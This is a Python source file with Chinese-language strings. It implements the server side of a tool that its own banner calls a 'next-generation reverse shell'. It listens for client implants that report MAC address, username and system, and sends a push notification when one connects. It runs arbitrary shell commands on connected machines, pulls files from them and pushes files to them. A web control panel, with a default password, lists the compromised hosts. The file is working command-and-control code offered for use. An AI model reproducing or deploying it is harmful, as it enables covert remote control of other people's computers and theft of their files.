import socket
import threading
import json
import time
import os
import base64
import requests
import secrets
import hashlib
from datetime import datetime
from queue import Queue, Empty
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
bark="https://bark.xxx/"#请替换为你自己的 Bark 服务器地址，末尾需要斜杠

class Server:
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.clients = {}
        self.server_socket = None
        self.monitoring = True
        self.heartbeat_timeout = 15

    def start_server(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)

        print(f"服务器启动，监听 {self.host}:{self.port}")

        monitor_thread = threading.Thread(target=self.monitor_clients, daemon=True)
        monitor_thread.start()

        try:
            while True:
                client_socket, address = self.server_socket.accept()
                threading.Thread(target=self.handle_client, args=(client_socket, address), daemon=True).start()
        except KeyboardInterrupt:
            print("服务器关闭")
        finally:
            self.monitoring = False
            try:
                self.server_socket.close()
            except Exception:
                pass

    def handle_client(self, client_socket, address):
        mac_address = None
        try:
            buffer = b""
            while b"\n" not in buffer:
                data = client_socket.recv(1024)
                if not data:
                    return
                buffer += data

            line, remainder = buffer.split(b"\n", 1)
            client_info = json.loads(line.decode('utf-8'))

            mac_address = client_info.get('mac')
            username = client_info.get('username')
            system_info = client_info.get('system')

            print(f"设备 {mac_address} 已连接，用户: {username}")
            x = requests.get(bark+f"设备 {mac_address} 已连接，用户: {username}")
            print(f"已发送通知到 Bark，状态码: {x.status_code}")

            self.clients[mac_address] = {
                'socket': client_socket,
                'lock': threading.Lock(),
                'info': client_info,
                'buffer': remainder,
                'queue': Queue(maxsize=2000),
                'ip': address[0],
                'port': address[1],
                'username': username,
                'system': system_info,
                'connected_at': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat(),
                'busy_until': 0
            }

            threading.Thread(target=self.client_reader, args=(mac_address,), daemon=True).start()

        except Exception as e:
            print(f"处理客户端连接时出错: {e}")
            if mac_address:
                self.cleanup_disconnected_client(mac_address)
            try:
                client_socket.close()
            except Exception:
                pass

    def client_reader(self, mac_address):
        if mac_address not in self.clients:
            return
        client_data = self.clients[mac_address]
        sock = client_data['socket']
        buffer = client_data['buffer']

        try:
            while True:
                if b"\n" not in buffer:
                    try:
                        sock.settimeout(10.0)
                        data = sock.recv(4096)
                        if not data:
                            break
                        buffer += data
                        client_data['last_seen'] = datetime.now().isoformat()
                    except socket.timeout:
                        continue
                    except Exception:
                        break

                while b"\n" in buffer:
                    line, buffer = buffer.split(b"\n", 1)
                    if not line.strip():
                        continue
                    try:
                        message = json.loads(line.decode('utf-8'))
                    except json.JSONDecodeError:
                        continue

                    client_data['last_seen'] = datetime.now().isoformat()

                    if message.get('type') == 'heartbeat':
                        continue

                    try:
                        client_data['queue'].put_nowait(message)
                    except Exception:
                        try:
                            _ = client_data['queue'].get_nowait()
                        except Empty:
                            pass
                        try:
                            client_data['queue'].put_nowait(message)
                        except Exception:
                            pass

                client_data['buffer'] = buffer

        finally:
            self.cleanup_disconnected_client(mac_address)

    def monitor_clients(self):
        while self.monitoring:
            try:
                now = time.time()
                for mac in list(self.clients.keys()):
                    client_data = self.clients.get(mac)
                    if not client_data:
                        continue
                    busy_until = client_data.get('busy_until', 0)
                    if now < busy_until:
                        continue
                    try:
                        last = datetime.fromisoformat(client_data['last_seen']).timestamp()
                    except Exception:
                        last = now
                    if now - last > self.heartbeat_timeout:
                        print(f"客户端 {mac} 超时离线")
                        self.cleanup_disconnected_client(mac)
                time.sleep(5)
            except Exception as e:
                print(f"监控线程异常: {e}")
                time.sleep(1)

    def list_devices(self):
        print("\n在线设备：")
        if not self.clients:
            print("暂无设备在线")
            return

        for mac, client_data in self.clients.items():
            print(f"  MAC: {mac}")
            print(f"  IP: {client_data['ip']}")
            print(f"  用户: {client_data['username']}")
            print(f"  系统: {client_data['system']}")
            print(f"  首次连接: {client_data['connected_at']}")
            print(f"  最后心跳: {client_data['last_seen']}")
            print("-" * 30)

    def cleanup_disconnected_client(self, mac_address):
        if mac_address in self.clients:
            try:
                self.clients[mac_address]['socket'].close()
            except Exception:
                pass
            del self.clients[mac_address]
            print(f"已移除失效的客户端: {mac_address}")

    def send_message_to_client(self, mac_address, message):
        if mac_address not in self.clients:
            print(f"客户端 {mac_address} 不存在或已断开")
            return False
        try:
            sock = self.clients[mac_address]['socket']
            message_str = json.dumps(message, ensure_ascii=False) + "\n"
            sock.sendall(message_str.encode("utf-8"))
            return True
        except Exception as e:
            print(f"发送消息到客户端时出错: {e}")
            self.cleanup_disconnected_client(mac_address)
            return False

    def receive_message_from_client(self, mac_address, timeout=30):
        if mac_address not in self.clients:
            return None
        q: Queue = self.clients[mac_address]['queue']
        try:
            message = q.get(timeout=timeout)
            return message
        except Empty:
            return None

    def execute_command_on_client(self, mac_address, command_str):
        if mac_address not in self.clients:
            return {'status': 'error', 'message': f'设备 {mac_address} 不在线'}

        client_data = self.clients[mac_address]
        lock = client_data['lock']

        try:
            with lock:
                client_data['busy_until'] = time.time() + 35

                command = {
                    'type': 'execute',
                    'command': command_str
                }

                if not self.send_message_to_client(mac_address, command):
                    return {'status': 'error', 'message': '发送命令失败'}

                result = self.receive_message_from_client(mac_address, timeout=30)

                if result:
                    client_data['last_seen'] = datetime.now().isoformat()
                    return result

                return {'status': 'error', 'message': '未收到客户端响应'}

        except Exception as e:
            return {'status': 'error', 'message': str(e)}

        finally:
            if mac_address in self.clients:
                self.clients[mac_address]['busy_until'] = 0
    
    def send_task(self, mac_address, task):
        if mac_address not in self.clients:
            return {'status': 'error', 'message': '设备不在线'}

        client_data = self.clients[mac_address]
        lock = client_data['lock']

        try:
            with lock:
                client_data['busy_until'] = time.time() + 30

                payload = {
                    'type': 'task',
                    **task
                }

                # 发送任务
                if not self.send_message_to_client(mac_address, payload):
                    return {'status': 'error', 'message': '发送任务失败'}

                # 等待结果
                result = self.receive_message_from_client(mac_address, timeout=20)

                if result:
                    client_data['last_seen'] = datetime.now().isoformat()
                    return result

                return {'status': 'error', 'message': '客户端未响应'}

        except Exception as e:
            return {'status': 'error', 'message': str(e)}

        finally:
            if mac_address in self.clients:
                self.clients[mac_address]['busy_until'] = 0

        client_data = self.clients[mac_address]
        lock = client_data['lock']

        try:
            with lock:
                client_data['busy_until'] = time.time() + 35
                command = {'type': 'execute', 'command': command_str}
                if not self.send_message_to_client(mac_address, command):
                    return {'status': 'error', 'message': '发送命令失败'}

                result = self.receive_message_from_client(mac_address, timeout=30)

                if result:
                    client_data['last_seen'] = datetime.now().isoformat()
                    return result
                return {'status': 'error', 'message': '未收到客户端响应或客户端已断开'}
        except Exception as e:
            return {'status': 'error', 'message': f'执行命令时出错: {str(e)}'}
        finally:
            if mac_address in self.clients:
                self.clients[mac_address]['busy_until'] = 0

    def download_file_from_client(self, mac_address, remote_path, local_path=None):
        if mac_address not in self.clients:
            return {'status': 'error', 'message': f'设备 {mac_address} 不在线'}

        if not remote_path:
            return {'status': 'error', 'message': '远程路径不能为空'}

        client_data = self.clients[mac_address]
        lock = client_data['lock']

        with lock:
            try:
                client_data['busy_until'] = time.time() + 300

                # 发送下载请求
                if not self.send_message_to_client(mac_address, {
                    'type': 'download',
                    'path': remote_path
                }):
                    return {'status': 'error', 'message': '下载请求发送失败'}

                file = None
                save_path = None
                total_size = 0
                received_size = 0

                start_time = time.time()

                while True:
                    msg = self.receive_message_from_client(mac_address, timeout=30)
                    if not msg:
                        return {'status': 'error', 'message': '下载过程中超时'}

                    mtype = msg.get('type')

                    # 开始
                    if mtype == 'download_start':
                        total_size = msg.get('size', 0)
                        filename = os.path.basename(msg.get('path', 'file'))

                        save_path = local_path if local_path else filename
                        save_path = os.path.abspath(save_path)

                        if os.path.isdir(save_path):
                            save_path = os.path.join(save_path, filename)

                        os.makedirs(os.path.dirname(save_path), exist_ok=True)
                        file = open(save_path, 'wb')

                        print(f"[下载开始] {filename} ({total_size} bytes)")

                    # 数据块
                    elif mtype == 'download_chunk':
                        chunk = base64.b64decode(msg['data'])
                        file.write(chunk)
                        received_size += len(chunk)

                        # 简单进度
                        if total_size > 0:
                            percent = received_size / total_size * 100
                            print(f"\r进度: {percent:.2f}% ({received_size}/{total_size})", end='')

                    # 结束
                    elif mtype == 'download_end':
                        if file:
                            file.close()
                        print("\n下载完成")

                        return {
                            'status': 'success',
                            'message': f'下载完成: {save_path}',
                            'size': received_size,
                            'local_path': save_path
                        }

                    # 错误
                    elif mtype == 'download_error':
                        if file:
                            file.close()
                        return msg

            finally:
                if mac_address in self.clients:
                    self.clients[mac_address]['busy_until'] = 0

    def upload_file_to_client(self, mac_address, local_path, remote_path=None):
        if mac_address not in self.clients:
            return {'status': 'error', 'message': f'设备 {mac_address} 不在线'}

        if not local_path:
            return {'status': 'error', 'message': '本地路径不能为空'}

        abs_local_path = os.path.abspath(local_path)
        if not os.path.isfile(abs_local_path):
            return {'status': 'error', 'message': f'本地文件不存在: {abs_local_path}'}

        try:
            with open(abs_local_path, 'rb') as f:
                file_bytes = f.read()
            data_b64 = base64.b64encode(file_bytes).decode('utf-8')
        except Exception as e:
            return {'status': 'error', 'message': f'读取本地文件失败: {e}'}

        target_path = remote_path if remote_path else os.path.basename(abs_local_path)

        client_data = self.clients[mac_address]
        lock = client_data['lock']
        with lock:
            try:
                client_data['busy_until'] = time.time() + 120
                payload = {
                    'type': 'upload',
                    'path': target_path,
                    'data': data_b64
                }
                if not self.send_message_to_client(mac_address, payload):
                    return {'status': 'error', 'message': '上传请求发送失败'}

                result = self.receive_message_from_client(mac_address, timeout=120)
                if not result:
                    return {'status': 'error', 'message': '上传超时，未收到客户端响应'}
                return result
            finally:
                if mac_address in self.clients:
                    self.clients[mac_address]['busy_until'] = 0


class WebControlPanel:
    """一个带权限控制的只读可视化面板，便于课堂演示。"""

    def __init__(self, server: Server, host='127.0.0.1', port=8080):
        self.server = server
        self.host = host
        self.port = port
        self.username = os.getenv('PANEL_USER', 'admin')
        self.password_hash = hashlib.sha256(os.getenv('PANEL_PASS', 'ChangeMe123!').encode('utf-8')).hexdigest()
        self.sessions = {}
        self.session_ttl = 60 * 60

    def verify_password(self, plain_text_password):
        return hashlib.sha256(plain_text_password.encode('utf-8')).hexdigest() == self.password_hash

    def create_session(self):
        token = secrets.token_urlsafe(32)
        self.sessions[token] = time.time() + self.session_ttl
        return token

    def validate_session(self, token):
        if not token:
            return False
        expire_at = self.sessions.get(token)
        if not expire_at:
            return False
        if time.time() > expire_at:
            del self.sessions[token]
            return False
        return True

    def start(self):
        panel = self

        class Handler(BaseHTTPRequestHandler):
            def _json(self, payload, status=200):
                body = json.dumps(payload, ensure_ascii=False).encode('utf-8')
                self.send_response(status)
                self.send_header('Content-Type', 'application/json; charset=utf-8')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def _html(self, content, status=200):
                body = content.encode('utf-8')
                self.send_response(status)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def _read_json(self):
                length = int(self.headers.get('Content-Length', '0'))
                if length <= 0:
                    return {}
                raw = self.rfile.read(length)
                return json.loads(raw.decode('utf-8'))

            def _token(self):
                return self.headers.get('X-Session-Token', '')

            def _require_auth(self):
                if panel.validate_session(self._token()):
                    return True
                self._json({'status': 'error', 'message': '未授权'}, status=401)
                return False

            def do_GET(self):
                if self.path == '/':
                    return self._html(self._dashboard_html())
                if self.path == '/api/clients':
                    if not self._require_auth():
                        return
                    clients = []
                    for mac, item in panel.server.clients.items():
                        clients.append({
                            'mac': mac,
                            'ip': item.get('ip'),
                            'username': item.get('username'),
                            'system': item.get('system'),
                            'connected_at': item.get('connected_at'),
                            'last_seen': item.get('last_seen'),
                        })
                    return self._json({'status': 'success', 'data': clients})
                return self._json({'status': 'error', 'message': 'Not Found'}, status=404)

            def do_POST(self):
                if self.path == '/api/login':
                    payload = self._read_json()
                    username = payload.get('username', '')
                    password = payload.get('password', '')
                    if username == panel.username and panel.verify_password(password):
                        token = panel.create_session()
                        return self._json({'status': 'success', 'token': token, 'ttl': panel.session_ttl})
                    return self._json({'status': 'error', 'message': '用户名或密码错误'}, status=401)

                if self.path == '/api/client/info':
                    if not self._require_auth():
                        return
                    payload = self._read_json()
                    mac = payload.get('mac')
                    if not mac:
                        return self._json({'status': 'error', 'message': 'mac 不能为空'}, status=400)
                    result = panel.server.send_message_to_client(mac, {'type': 'info'})
                    if not result:
                        return self._json({'status': 'error', 'message': '设备不在线或请求发送失败'}, status=400)
                    msg = panel.server.receive_message_from_client(mac, timeout=10)
                    if not msg:
                        return self._json({'status': 'error', 'message': '设备未响应'}, status=504)
                    return self._json(msg)
                if self.path == '/api/task':
                    if not self._require_auth():
                        return

                    payload = self._read_json()
                    mac = payload.get('mac')
                    task_type = payload.get('task')
                    path = payload.get('path')

                    if not mac or not task_type:
                        return self._json({'status': 'error', 'message': '参数错误'}, 400)

                    task = {"task": task_type}
                    if path:
                        task["path"] = path

                    result = panel.server.send_task(mac, task)
                    #print(f"[TASK RESULT] <- {result}")
                    return self._json(result)

                return self._json({'status': 'error', 'message': 'Not Found'}, status=404)

            def log_message(self, format, *args):
                return

            def _dashboard_html(self):
                return """<!doctype html>
        <!doctype html>
        <html lang="zh-CN">
        <head>
        <meta charset="utf-8"/>
        <meta name="viewport" content="width=device-width, initial-scale=1"/>
        <title>Control Panel</title>

        <style>
        body {
        margin: 0;
        font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;
        background: linear-gradient(135deg,#0f2027,#203a43,#2c5364);
        color: #fff;
        }

        .container {
        padding: 24px;
        max-width: 1200px;
        margin: auto;
        }

        .card {
        background: rgba(255,255,255,0.05);
        backdrop-filter: blur(16px);
        border-radius: 16px;
        padding: 20px;
        margin-bottom: 20px;
        box-shadow: 0 10px 40px rgba(0,0,0,.4);
        }

        h2 { margin-top: 0; }

        input, select {
        padding: 10px;
        border-radius: 10px;
        border: none;
        margin: 5px;
        background: rgba(255,255,255,0.1);
        color: #fff;
        }

        button {
        padding: 10px 16px;
        border-radius: 10px;
        border: none;
        background: linear-gradient(135deg,#4facfe,#00f2fe);
        color: #fff;
        cursor: pointer;
        transition: .2s;
        }
        button:hover {
        transform: translateY(-1px);
        box-shadow: 0 6px 20px rgba(0,0,0,.4);
        }

        table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 10px;
        }

        th, td {
        padding: 10px;
        border-bottom: 1px solid rgba(255,255,255,0.1);
        font-size: 13px;
        }

        tr:hover {
        background: rgba(255,255,255,0.05);
        }

        .status-online { color: #00ff9c; }
        .status-offline { color: #ff5c5c; }

        pre {
        background: #000;
        color: #00ff00;
        padding: 12px;
        border-radius: 10px;
        max-height: 300px;
        overflow: auto;
        }

        .topbar {
        display: flex;
        justify-content: space-between;
        align-items: center;
        }

        .badge {
        padding: 4px 10px;
        border-radius: 999px;
        background: rgba(0,255,150,0.2);
        font-size: 12px;
        }

        </style>
        </head>

        <body>
        <div class="container">

        <!-- 登录 -->
        <div class="card">
        <h2>登录</h2>
        <input id="username" value="admin">
        <input id="password" type="password" placeholder="密码">
        <button onclick="login()">登录</button>
        <span id="loginStatus"></span>
        </div>

        <!-- 设备 -->
        <div class="card">
        <div class="topbar">
            <h2>在线设备</h2>
            <div>
            <button onclick="refreshClients()">刷新</button>
            <span class="badge" id="count">0 台设备</span>
            </div>
        </div>

        <table>
            <thead>
            <tr>
                <th>MAC</th>
                <th>IP</th>
                <th>用户</th>
                <th>系统</th>
                <th>状态</th>
                <th>操作</th>
            </tr>
            </thead>
            <tbody id="clients"></tbody>
        </table>
        </div>

        <!-- 运维 -->
        <div class="card">
        <h2>运维任务</h2>

        <select id="taskMac"></select>

        <select id="taskType">
            <option value="get_system_info">系统信息</option>
            <option value="list_process">进程列表</option>
            <option value="list_dir">目录列表</option>
        </select>

        <input id="taskPath" placeholder="路径（可选）">

        <button onclick="runTask()">执行</button>

        <pre id="taskOutput">等待执行...</pre>
        </div>

        </div>

        <script>
        let token = "";
        let clientsCache = [];

        async function login(){
        const res = await fetch('/api/login',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({
            username:username.value,
            password:password.value
            })
        });

        const data = await res.json();

        if(data.status === 'success'){
            token = data.token;
            loginStatus.innerText = "登录成功";
            refreshClients();
            setInterval(refreshClients, 5000);
        }else{
            loginStatus.innerText = "登录失败";
        }
        }

        async function refreshClients(){
        const res = await fetch('/api/clients',{
            headers:{'X-Session-Token':token}
        });

        const data = await res.json();
        if(data.status !== 'success') return;

        clientsCache = data.data;

        clients.innerHTML = "";
        taskMac.innerHTML = "";

        document.getElementById("count").innerText = clientsCache.length + " 台设备";

        clientsCache.forEach(c => {

            // 表格
            const tr = document.createElement("tr");
            tr.innerHTML = `
            <td>${c.mac}</td>
            <td>${c.ip}</td>
            <td>${c.username}</td>
            <td>${c.system}</td>
            <td class="status-online">在线</td>
            <td><button onclick="selectDevice('${c.mac}')">选择</button></td>
            `;
            clients.appendChild(tr);

            // 下拉
            const opt = document.createElement("option");
            opt.value = c.mac;
            opt.textContent = `${c.mac} (${c.username})`;
            taskMac.appendChild(opt);
        });
        }

        function selectDevice(mac){
        taskMac.value = mac;
        }

        async function runTask(){
        taskOutput.textContent = "执行中...";

        const res = await fetch('/api/task',{
            method:'POST',
            headers:{
            'Content-Type':'application/json',
            'X-Session-Token':token
            },
            body:JSON.stringify({
            mac:taskMac.value,
            task:taskType.value,
            path:taskPath.value
            })
        });

        const data = await res.json();

        taskOutput.textContent = JSON.stringify(data,null,2);
        }
        </script>

        </body>
        </html>"""

        httpd = ThreadingHTTPServer((self.host, self.port), Handler)
        print(f"Web 控制台启动：http://{self.host}:{self.port}")
        print("提示：请尽快修改 PANEL_PASS 环境变量。")
        httpd.serve_forever()


def server_cli(server: Server):
    current_client = None

    print("下一代反向shell（）")
    print("可用命令:")
    print("  list - 列出所有设备")
    print("  use <mac> - 选择要控制的设备")
    print("  bye - 退出当前设备会话")
    print("  在设备会话内可用：")
    print("    download <远程路径> [本地保存路径] - 从客户端下载文件")
    print("    upload <本地路径> [远程保存路径] - 上传文件到客户端")
    print("  quit - 退出服务器")

    while True:
        try:
            if current_client is None:
                command = input("\n> ").strip().split()
                if not command:
                    continue
                if command[0] == 'list':
                    server.list_devices()
                elif command[0] == 'use' and len(command) > 1:
                    mac = command[1]
                    if mac in server.clients:
                        current_client = mac
                        info = server.clients[mac]
                        print(f"已连接到设备 {mac} ({info['username']}@{info['ip']})")
                        print("输入 'bye' 返回主菜单")
                    else:
                        print(f"设备 {mac} 不在线")
                elif command[0] == 'quit':
                    print("正在关闭服务器...")
                    break
                else:
                    print("未知命令")
            else:
                user_input = input(f"{current_client}> ").strip()
                if not user_input:
                    continue
                if user_input.lower() == 'bye':
                    current_client = None
                    print("已返回主菜单")
                    continue

                if user_input.startswith('download '):
                    parts = user_input.split(maxsplit=2)
                    remote_path = parts[1] if len(parts) > 1 else ''
                    local_path = parts[2] if len(parts) > 2 else None
                    result = server.download_file_from_client(current_client, remote_path, local_path)
                    if result.get('status') == 'success':
                        print(result.get('message', '下载成功'))
                        print(f"文件大小: {result.get('size', 0)} bytes")
                    else:
                        print(f"错误: {result.get('message', '未知错误')}")
                    continue

                if user_input.startswith('upload '):
                    parts = user_input.split(maxsplit=2)
                    local_path = parts[1] if len(parts) > 1 else ''
                    remote_path = parts[2] if len(parts) > 2 else None
                    result = server.upload_file_to_client(current_client, local_path, remote_path)
                    if result.get('status') == 'success':
                        print(result.get('message', '上传成功'))
                    else:
                        print(f"错误: {result.get('message', '未知错误')}")
                    continue

                result = server.execute_command_on_client(current_client, user_input)
                if result.get('status') == 'success':
                    stdout = result.get('stdout', '')
                    stderr = result.get('stderr', '')
                    returncode = result.get('returncode', 0)
                    current_dir = result.get('current_dir', '')
                    if current_dir:
                        print(f"当前目录: {current_dir}")
                    if stdout:
                        print(stdout, end='' if stdout.endswith('\n') else '\n')
                    if stderr:
                        print(stderr, end='' if stderr.endswith('\n') else '\n')
                    if returncode != 0:
                        print(f"(返回码: {returncode})")
                else:
                    print(f"错误: {result.get('message', '未知错误')}")
        except KeyboardInterrupt:
            if current_client:
                current_client = None
                print("\n已返回主菜单")
            else:
                print("\n正在关闭服务器...")
                break
        except Exception as e:
            print(f"命令执行出错: {e}")


if __name__ == "__main__":
    server = Server()
    socket_thread = threading.Thread(target=server.start_server, daemon=True)
    socket_thread.start()

    panel = WebControlPanel(
        server=server,
        host=os.getenv('PANEL_HOST', '0.0.0.0'),
        port=int(os.getenv('PANEL_PORT', '8088')),
    )
    threading.Thread(target=panel.start, daemon=True).start()

    time.sleep(1)
    server_cli(server)
